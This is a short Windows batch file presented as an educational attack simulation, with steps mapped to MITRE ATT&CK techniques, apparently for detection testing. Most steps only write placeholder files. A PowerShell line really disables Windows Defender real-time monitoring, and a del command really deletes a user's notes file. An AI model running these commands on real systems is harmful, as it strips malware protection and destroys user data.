@echo off
:: Attack Simulation Script - Educational Purpose
:: MITRE ATT&CK Techniques Demonstrated

:: T1562.001 - Disable Windows Defender
powershell -Command "Set-MpPreference -DisableRealtimeMonitoring $true"

:: T1105 - Simulated remote file download
echo Simulated malicious download > %TEMP%\update.txt

:: T1003 - Credential harvesting simulation
echo Login: admin > %APPDATA%\credentials.txt
echo Password: 123456 >> %APPDATA%\credentials.txt

:: T1070.004 - Evidence destruction
del /Q "C:\Users\%USERNAME%\Documents\notes.txt"

exit
